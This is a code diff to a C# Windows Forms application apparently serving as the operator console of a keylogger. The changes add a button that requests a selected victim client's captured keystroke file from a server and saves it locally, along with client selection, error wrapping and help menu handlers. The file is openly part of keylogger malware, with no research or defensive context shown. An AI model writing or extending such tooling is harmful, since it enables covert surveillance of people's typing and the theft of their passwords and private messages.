@@ -2,9 +2,11 @@ using System;
 using System.Net;
 using System.Net.Http;
 using System.Net.Sockets;
+using System.Reflection.Metadata;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using Common;
 
 namespace KeyloggerServer
 {
@@ -39,7 +41,8 @@ namespace KeyloggerServer
             }
             catch (Exception ex)
             {
-                AppendLog($"Connection error: {ex.Message}");
+                var kex = new KeyloggerException("Connection error", ex);
+                AppendLog(kex.ToString());
             }
         }
 
@@ -55,17 +58,44 @@ namespace KeyloggerServer
                     if (bytesRead == 0) break; // disconnected
 
                     string message = Encoding.UTF8.GetString(buffer, 0, bytesRead);
+
                     if (message.StartsWith("[LIST]"))
                     {
                         string[] ids = message.Substring(6).Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
                         UpdateClientList(ids);
+                    }
+                    else if (message.StartsWith("[FILE]"))
+                    {
+                        string fileContent = message.Substring(6); // Remove "[FILE]"
+                        if (this.InvokeRequired)
+                        {
+                            this.Invoke(new Action(() =>
+                            {
+                                using (SaveFileDialog saveFileDialog = new SaveFileDialog())
+                                {
+                                    saveFileDialog.Filter = "Text files (*.txt)|*.txt";
+                                    saveFileDialog.FileName = currentlySelectedClientId.Replace(":", "_") + ".txt";
+
+                                    if (saveFileDialog.ShowDialog() == DialogResult.OK)
+                                    {
+                                        File.WriteAllText(saveFileDialog.FileName, fileContent);
+                                        AppendLog("File saved successfully.");
+                                    }
+                                }
+                            }));
+                        }
+                    }
+                    else if (message.StartsWith("[ERROR]"))
+                    {
+                        string errorMessage = message.Substring(7); // Remove "[ERROR]"
+                        AppendLog("Server error: " + errorMessage);
+                        MessageBox.Show("Server error: " + errorMessage, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                     }
                     else if (message.StartsWith("["))
                     {
                         int end = message.IndexOf(']');
                         string clientId = message.Substring(1, end - 1);
                         string content = message.Substring(end + 1);
-
 
                         if (clientId == currentlySelectedClientId)
                             AppendMessage(content);
@@ -78,9 +108,11 @@ namespace KeyloggerServer
             }
             catch (Exception ex)
             {
-                AppendLog($"Error while receiving: {ex.Message}");
+                var kex = new KeyloggerException("Error while receiving data from server.", ex);
+                AppendLog(kex.ToString());
             }
         }
+
         private void AppendLog(string text)
         {
             if (InvokeRequired)
@@ -109,7 +141,8 @@ namespace KeyloggerServer
             }
             catch (Exception ex)
             {
-                AppendLog($"Error on stop: {ex.Message}");
+                var kex = new KeyloggerException("Error while stopping observer client.", ex);
+                AppendLog(kex.ToString());
             }
             finally
             {
@@ -146,10 +179,12 @@ namespace KeyloggerServer
             {
                 currentlySelectedClientId = listViewClients.SelectedItems[0].Text;
                 textBoxMessage.Clear(); // optional: clear old keystrokes
+                buttonDownload.Enabled = true;
             }
             else
             {
                 currentlySelectedClientId = null;
+                buttonDownload.Enabled = false;
             }
         }
 
@@ -172,18 +207,38 @@ namespace KeyloggerServer
             }
             catch (Exception ex)
             {
-                MessageBox.Show($"Failed to refresh list: {ex.Message}");
+                var kex = new KeyloggerException("Failed to refresh client list.", ex);
+                MessageBox.Show(kex.ToString());
+            }
+        }
+        private async void buttonDownload_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                // Send "getfile" command to the server
+                string command = "getfile " + currentlySelectedClientId + "\n";
+                byte[] commandBytes = Encoding.UTF8.GetBytes(command);
+                await _stream.WriteAsync(commandBytes, 0, commandBytes.Length);
+                await _stream.FlushAsync();
+
+                // Response will be handled in ListenLoop
+            }
+            catch (Exception ex)
+            {
+                var kex = new KeyloggerException("Failed to request file from server.", ex);
+                MessageBox.Show(kex.ToString());
             }
         }
 
-        private void toolStripLabel1_Click(object sender, EventArgs e)
-        {
 
+        private void buttonExit_Click(object sender, EventArgs e)
+        {
+            Environment.Exit(0);
         }
 
-        private void menuStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
+        private void helpToolStripMenuItem_Click(object sender, EventArgs e)
         {
-
+            Help.ShowHelp(this, "HELP.chm");
         }
     }
 }
